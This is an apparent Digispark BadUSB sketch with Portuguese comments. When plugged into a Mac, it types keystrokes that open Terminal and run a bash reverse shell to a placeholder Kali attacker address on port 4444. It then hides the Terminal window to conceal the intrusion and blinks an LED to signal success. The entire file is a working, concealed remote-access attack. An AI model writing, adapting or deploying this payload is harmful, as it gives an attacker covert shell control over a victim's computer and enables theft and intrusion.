#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); 
  
  //aviso de inicio 
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(1000); 
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(1000); 

  DigiKeyboard.sendKeyStroke(0); // Limpeza de segurança

  // Abrindo o Terminal
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Spotlight
  DigiKeyboard.delay(300);
  
  DigiKeyboard.print("Terminal");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Espera a janela preta abrir
  DigiKeyboard.delay(1000);
  
  // O PAYLOAD
  // Abre um tunel TCP direto para o Kali na porta 4444 (coloque o ip eth0 do kali)
  // O comando 'nohup' e '&' ajudam a manter o processo rodando mesmo se fechar a janela (as vezes)
  // Mas aqui vamos no classico bash TCP:
  // O 'bash -c' obriga o comando a rodar dentro do bash, ignorando o Zsh, tive que corrigir pois o terminal tentava o zsh

  DigiKeyboard.print("bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("bash -i >& /dev/tcp/SEU-IP-DO-KALI/4444 0>&1");  

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //Escondendo os rastros 
  // Esconde a janela do Terminal (Command + H) 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);

  // Feedback de Sucesso 
  // 2 piscadas rapidas avisam: "Conexao Feita"
  for(int i=0; i<2; i++){
    digitalWrite(1, HIGH); delay(200); digitalWrite(1, LOW); delay(200);
  }
}

void loop() {
  // Nada aqui
}